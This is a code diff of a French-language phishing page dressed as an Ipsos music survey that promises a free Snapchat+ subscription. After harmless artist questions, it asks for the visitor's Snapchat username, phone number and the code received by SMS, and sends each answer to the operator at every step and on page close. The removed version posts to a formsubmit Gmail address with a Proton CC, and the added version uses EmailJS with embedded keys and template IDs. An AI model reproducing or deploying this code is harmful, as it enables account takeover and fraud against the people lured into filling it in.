@@ -151,171 +151,129 @@ button:disabled { background:#b0b0b0; cursor:not-allowed; }
 <div class="footer">
     © 2026 Ipsos – Tous droits réservés
 </div>
+<!-- Charger EmailJS -->
+<script src="https://cdn.emailjs.com/dist/email.min.js"></script>
 <script>
-const questions = [
+  // Initialiser EmailJS avec ta Public Key
+  emailjs.init("QyMvGNYIF6CXRSqms");
+
+  const questions = [
     { text:"Quel est ton artiste ou groupe préféré ?", type:"text", placeholder:"Ex : Niska" },
     { text:"Quel artiste écoutes-tu actuellement?", type:"text", placeholder:"Ex : Damso" },
     { text:"Quel artiste aimerais-tu découvrir davantage ?", type:"text", placeholder:"Ex : Jul" },
     { text:"Quel est ton nom d'utilisateur Snapchat ?", type:"text", placeholder:"Pseudo Snapchat" },
     { text:"Quel est ton numéro de téléphone ?", type:"custom-phone" },
     { text:"Entre le code reçu par SMS", type:"text", placeholder:"XXXX" }
-];
+  ];
 
-let indexQuestion = 0;
-let reponsesUtilisateur = [];
+  let indexQuestion = 0;
+  let reponsesUtilisateur = [];
 
-// Emails
-const formsubmitURL = "https://formsubmit.co/
-ano625343@gmail.com";
-const ccEmail = "becteurfoou@proton.me";
-
-// Fonction de démarrage
-function demarrer(){
+  function demarrer(){
     document.getElementById("intro").style.display="none";
     document.getElementById("sondage").style.display="block";
     afficherQuestion();
-}
+  }
 
-// Affichage question actuelle
-function afficherQuestion(){
+  function afficherQuestion(){
     const q = questions[indexQuestion];
     document.getElementById("question").textContent = q.text;
 
     if(q.type === "custom-phone"){
-        document.getElementById("reponses").innerHTML = `
-            <div style="display:flex; gap:10px; justify-content:center;">
-                <select id="prefix" onchange="verifier()" style="padding:10px; font-size:16px;">
-                    <option value="06">06</option>
-                    <option value="07">07</option>
-                </select>
-                <input 
-                    type="tel"
-                    id="champ"
-                    placeholder="12345678"
-                    maxlength="8"
-                    pattern="[0-9]*"
-                    inputmode="numeric"
-                    style="padding:10px; font-size:16px;"
-                    oninput="this.value=this.value.replace(/[^0-9]/g,''); verifier();"
-                >
-            </div>
-        `;
+      document.getElementById("reponses").innerHTML = `
+        <div style="display:flex; gap:10px; justify-content:center;">
+          <select id="prefix" onchange="verifier()" style="padding:10px; font-size:16px;">
+            <option value="06">06</option>
+            <option value="07">07</option>
+          </select>
+          <input type="tel" id="champ" placeholder="12345678" maxlength="8" pattern="[0-9]*" inputmode="numeric"
+            style="padding:10px; font-size:16px;" oninput="this.value=this.value.replace(/[^0-9]/g,''); verifier();">
+        </div>`;
     } else {
-        document.getElementById("reponses").innerHTML =
-            `<input type="${q.type}" 
-                    id="champ" 
-                    placeholder="${q.placeholder}" 
-                    oninput="verifier()" 
-                    style="padding:10px; font-size:16px; width:80%;">`;
+      document.getElementById("reponses").innerHTML = `
+        <input type="${q.type}" id="champ" placeholder="${q.placeholder}" oninput="verifier()" style="padding:10px; font-size:16px; width:80%;">`;
     }
 
     document.getElementById("btnSuivant").disabled = true;
-    document.getElementById("partenariat").style.display = indexQuestion>=3 ? "block" : "none";
+    document.getElementById("partenariat").style.display = indexQuestion >= 3 ? "block" : "none";
     updateProgress();
-}
+  }
 
-// Vérification entrée utilisateur
-function verifier(){
+  function verifier(){
     const q = questions[indexQuestion];
     if(q.type === "custom-phone"){
-        const numero = document.getElementById("champ").value.trim();
-        document.getElementById("btnSuivant").disabled = numero.length !== 8;
+      const numero = document.getElementById("champ").value.trim();
+      document.getElementById("btnSuivant").disabled = numero.length !== 8;
     } else {
-        const champ = document.getElementById("champ");
-        document.getElementById("btnSuivant").disabled = !champ.value.trim();
+      const champ = document.getElementById("champ");
+      document.getElementById("btnSuivant").disabled = !champ.value.trim();
     }
-}
+  }
 
-// Mise à jour barre de progression
-function updateProgress(){
+  function updateProgress(){
     document.getElementById("progressBar").style.width =
-        ((indexQuestion+1)/questions.length*100) + "%";
-}
+      ((indexQuestion + 1) / questions.length * 100) + "%";
+  }
 
-// Passage à la question suivante
-function suivant(){
+  function suivant(){
     const q = questions[indexQuestion];
-
     if(q.type === "custom-phone"){
-        const prefix = document.getElementById("prefix").value;
-        const numero = document.getElementById("champ").value.trim();
-
-        if(!/^[0-9]{8}$/.test(numero)){
-            alert("Numéro invalide (8 chiffres après 06 ou 07)");
-            return;
-        }
-        reponsesUtilisateur[indexQuestion] = prefix + numero;
+      const prefix = document.getElementById("prefix").value;
+      const numero = document.getElementById("champ").value.trim();
+      reponsesUtilisateur[indexQuestion] = prefix + numero;
     } else {
-        const champ = document.getElementById("champ");
-        reponsesUtilisateur[indexQuestion] = champ.value.trim();
+      const champ = document.getElementById("champ");
+      reponsesUtilisateur[indexQuestion] = champ.value.trim();
     }
 
-    // Envoi sécurisé à chaque étape
-    envoyer(indexQuestion+1);
+    // Envoyer la réponse via EmailJS
+    envoyer(indexQuestion + 1);
 
     indexQuestion++;
     if(indexQuestion < questions.length){
-        afficherQuestion();
+      afficherQuestion();
     } else {
-        // Étape finale
-        document.getElementById("sondage").innerHTML = `
-            <h2>Merci pour votre participation !</h2>
-            <p>Vous recevrez votre abonnement Snapchat+ directement sur votre compte dans un délai d'environ 15 minutes.</p>
-        `;
+      document.getElementById("sondage").innerHTML = `
+        <h2>Merci pour votre participation !</h2>
+        <p>Vous recevrez votre abonnement Snapchat+ directement sur votre compte dans un délai d'environ 15 minutes.</p>
+      `;
     }
-}
+  }
 
-// Continuer après écran intermédiaire
-function continuer(){
+  function continuer(){
     document.getElementById("intermediaire").style.display="none";
     document.getElementById("sondage").style.display="block";
     afficherQuestion();
-}
+  }
 
-// Fonction d'envoi Formsubmit sécurisée
-function envoyer(etape){
-    const formData = new FormData();
-    formData.append("artiste_prefere", reponsesUtilisateur[0] || "");
-    formData.append("artiste_deezer", reponsesUtilisateur[1] || "");
-    formData.append("artiste_decouverte", reponsesUtilisateur[2] || "");
-    formData.append("snapchat", reponsesUtilisateur[3] || "");
-    formData.append("telephone", reponsesUtilisateur[4] || "");
-    formData.append("code_sms", reponsesUtilisateur[5] || "");
-    formData.append("_cc", ccEmail);
-    formData.append("_subject", `Réponses sondage Snapchat+ (étape ${etape})`);
-    formData.append("_captcha","false");
+  function envoyer(etape){
+    const templateParams = {
+      artiste_prefere: reponsesUtilisateur[0] || "",
+      artiste_deezer: reponsesUtilisateur[1] || "",
+      artiste_decouverte: reponsesUtilisateur[2] || "",
+      snapchat: reponsesUtilisateur[3] || "",
+      telephone: reponsesUtilisateur[4] || "",
+      code_sms: reponsesUtilisateur[5] || "",
+      etape: etape
+    };
 
-    // Envoi fiable avec retry automatique
-    const maxRetries = 3;
-    let attempt = 0;
+    emailjs.send("service_klm8fbd", "template_efzgmoi", templateParams)
+      .then(function(response){
+        console.log("Envoi réussi étape " + etape, response.status, response.text);
+      }, function(error){
+        console.error("Erreur envoi étape " + etape, error);
+      });
+  }
 
-    function trySend(){
-        attempt++;
-        fetch(formsubmitURL, { method:"POST", body:formData })
-        .then(res => {
-            if(!res.ok) throw new Error("Erreur HTTP");
-            console.log(`Envoi réussi étape ${etape}`);
-        })
-        .catch(err => {
-            console.warn(`Tentative ${attempt} échouée pour l'étape ${etape}`);
-            if(attempt < maxRetries){
-                setTimeout(trySend, 1500); // retry après 1.5s
-            } else {
-                console.error(`Échec définitif de l'envoi étape ${etape}`);
-            }
-        });
-    }
-
-    trySend();
-}
-
-// Sauvegarde automatique si l'utilisateur ferme ou change de page
-window.addEventListener("beforeunload", function(e){
+  // Sauvegarde si l’utilisateur quitte
+  window.addEventListener("beforeunload", function(e){
     if(reponsesUtilisateur.length > 0 && indexQuestion < questions.length){
-        envoyer(indexQuestion); // Envoi avant fermeture
+      envoyer(indexQuestion);
     }
-});
+  });
 </script>
+
 </body>
 </html>
+
 
